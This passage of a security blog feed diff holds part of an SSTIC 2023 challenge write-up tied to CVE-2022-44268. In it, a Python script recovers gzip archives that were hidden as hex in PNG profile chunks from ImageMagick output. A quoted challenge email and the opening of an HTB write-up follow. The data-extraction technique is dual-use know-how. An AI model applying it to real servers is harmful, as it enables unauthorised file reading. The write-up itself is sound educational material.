+&lt;img alt="resized image with devices.tar.gz embedded" src="/media/2023.05/out_devices_tgz.png"/&gt;&lt;/p&gt;
+&lt;p&gt;Using the previous python script resulted as an error &lt;code&gt;UnicodeDecodeError: 'utf-8' codec can't
+decode byte 0x8b in position 4&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;So we looked directly at the content of the chunk string using &lt;code&gt;print(chunk_string.decode("utf-8"))&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python decoder.py out_devices_tgz.png | head
+
+tgz
+  776678
+1f8b0800000000000003ec7b09981e5599ee
+
+
+python decoder.py out_backup_tgz.png | head
+
+tgz
+  927243
+1f8b0800000000000003ec3c0b901cd5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;For both files we retrieved the same starting data for the chunk: &lt;code&gt;1f8b0800000000000003ec&lt;/code&gt;. A few
+researches pointed us to a &lt;code&gt;GZip&lt;/code&gt; archive.&lt;/p&gt;
+&lt;p&gt;We used &lt;a href="https://speakerdeck.com/ange/gzip-equals-zip-equals-zlib-equals-deflate?slide=16"&gt;ange knowledge about &lt;code&gt;zlib&lt;/code&gt; and &lt;code&gt;deflate&lt;/code&gt;&lt;/a&gt;
+to ensure that the files we are getting are compressed &lt;code&gt;tgz&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;A simple addition to our python script allowed us to write our chunk into a valid &lt;code&gt;tar.gz&lt;/code&gt; file.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;zlib&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;struct&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
+
+&lt;span class="nb"&gt;input&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'rb'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;PngSignature&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="se"&gt;\x89&lt;/span&gt;&lt;span class="s1"&gt;PNG&lt;/span&gt;&lt;span class="se"&gt;\r\n\x1a\n&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PngSignature&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;PngSignature&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'Invalid PNG Signature'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;read_chunk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;chunk_length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;chunk_type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unpack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'&amp;gt;I4s'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;chunk_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chunk_length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;chunk_expected_crc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unpack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'&amp;gt;I'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;chunk_actual_crc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;zlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crc32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chunk_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;zlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crc32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'&amp;gt;4s'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;chunk_type&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;chunk_expected_crc&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;chunk_actual_crc&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'chunk checksum failed'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;chunk_type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;chunk_data&lt;/span&gt;
+
+&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;chunk_type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;chunk_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;read_chunk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chunk_type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;'tEXt'&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;'zTXt'&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;chunk_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;'Raw profile type'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+            &lt;span class="n"&gt;chunk_string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;""&lt;/span&gt;
+            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;chunk_type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;'zTXt'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+                &lt;span class="n"&gt;chunk_string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;zlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decompress&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chunk_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="p"&gt;:]))&lt;/span&gt;
+            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+                &lt;span class="n"&gt;chunk_string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;chunk_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;
+            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;chunk_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;'php'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+                &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fromhex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;""&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;chunk_string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"utf-8"&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:]))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"utf-8"&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+                &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fromhex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;""&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;chunk_string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"utf-8"&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:]))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"utf-8"&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+                &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;chunk_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;'tgz'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+                &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'test.gz'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'wb'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;fout&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+                    &lt;span class="n"&gt;fout&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;binascii&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unhexlify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chunk_string&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"utf-8"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;""&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;chunk_type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;'IEND'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;break&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;We then ran the script on the backup and device "images". Once uncompressed with &lt;code&gt;tar&lt;/code&gt; we obtain the
+following file structure (the two archives merged themself):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;  ★ backup
+     ★ info.eml
+    ★ deviceA
+       ★ baker_pubkey.py
+       ★ logs.txt
+       ★ musig2_player.py
+    ★ deviceB
+       ★ loop
+       ★ loop_
+       ★ seed.bin
+       ★ seedlocker.py
+    ★ deviceC
+       ★ frontend_service.bin
+       ★ ld-linux-aarch64.so.1
+       ★ pow_solver.py
+       ★ remote_lib.so.6
+    ★ flags
+      ★ encrypted_flags
+       ★ crypt.py
+       ★ requirements.txt
+    ★ server
+      ★ static
+         ★ creme.jpeg
+         ★ farbreton.jpeg
+         ★ kouign.jpeg
+         ★ lobsterdog.png
+         ★ lobsterdog_baker.png
+         ★ meringue.jpeg
+         ★ palet.jpeg
+         ★ quatrequart.jpeg
+      ★ templates
+        ★ achat_templates
+        ★ admin_templates
+         ★ base.html
+         ★ index.html
+       ★ achat.py
+       ★ admin.py
+       ★ config.py
+       ★ deploy.py
+       ★ main.py
+       ★ musig2.py
+       ★ requirements.txt
+       ★ smart_contract.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Looking at &lt;code&gt;info.eml&lt;/code&gt; we found a new domain &lt;code&gt;https://trois-pains-zero.quatre-qu.art/&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Salut Bertrand,&lt;/p&gt;
+&lt;p&gt;Comme tu le sais, nous sommes en train de mettre en place l’infrastructure pour la sortie prochaine de notre JNF sur https://trois-pains-zero.quatre-qu.art/.
+Nous avons choisi de protéger notre interface d’administration en utilisant un chiffrement multi-signature 4 parmi 4 en utilisant différents dispositifs pour stocker les clés privées.&lt;/p&gt;
+&lt;p&gt;Pour rappel tu trouveras les fichiers nécessaire dans la sauvegarde :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;le script que j'ai utilisé pour participer au protocole de multi-signature : musig2_player.py. J'ai aussi inclus le fichier de journalisation de signatures que nous avions fait jeudi dernier ainsi que nos 4 clés publiques.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;un porte-monnaie numérique dont tu possèdes le mot de passe: seedlocker.py&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;un équipement physique, disponible ici device.quatre-qu.art:8080, je crois que c'est Charly qui a le mot de passe. Si tu veux tester sur ton propre équipement tu trouveras la mise à jour de l'interface utilisateur sur le serveur de sauvegarde avec la libc utilisée. Nous avons mis en place des limitations, une à base de preuve de travail, nous t'avons aussi fourni le script de résolution (pow_solver.py) ainsi qu'un mot de passe "fudmH/MGzgUM7Zx3k6xMuvThTXh+ULf1".
+Le mot de passe n'est pas celui de l'équipement mais celui pour la protection.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Pour le dernier équipement, Daniel a perdu son code pin.
+Nous avons essayé d’extraire les informations en attaquant la mémoire sécurisée avec des injections de fautes mais sans succès 😒.
+Pour information la mémoire sécurisée prends un masque en argument et utilise la valeur stockée XORé avec le masque. Les mesures qu'on a faites pendant l'expérience sont stockées dans data.h5. Il est trop volumineux pour la sauvegarde mais tu peux le récupérer à cette adresse : https://trois-pains-zero.quatre-qu.art/data_34718ec031bbb6e094075a0c7da32bc5056a57ff082c206e6b70fcc864df09e9.h5.
+Peut-être que tu connais quelqu’un qui pourrait nous aider à retrouver les informations ?&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Bon courage!&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We now have four independent tasks corresponding to step 2.a, 2.b, 2.c and 2.d.
+But they are not web related and after a few hours I just let it go as I will not be able to complete them.&lt;/p&gt;</content><category term="security"/><category term="security"/><category term="CVE-2022-44268"/><category term="ImageMagick"/><category term="SSTIC"/></entry><entry><title>HTB: Backdoor</title><link href="https://maggick.fr/2022/04/htb-backdoor.html" rel="alternate"/><published>2022-04-25T15:40:00+02:00</published><updated>2022-04-25T15:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-04-25:/2022/04/htb-backdoor.html</id><summary type="html">&lt;p&gt;&lt;img alt="Backdoor" class="align-left" src="/media/2022.04/backdoor_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.com/home/machines/profile/416"&gt;Backdoor&lt;/a&gt; publish on
 November 20, 2021 by
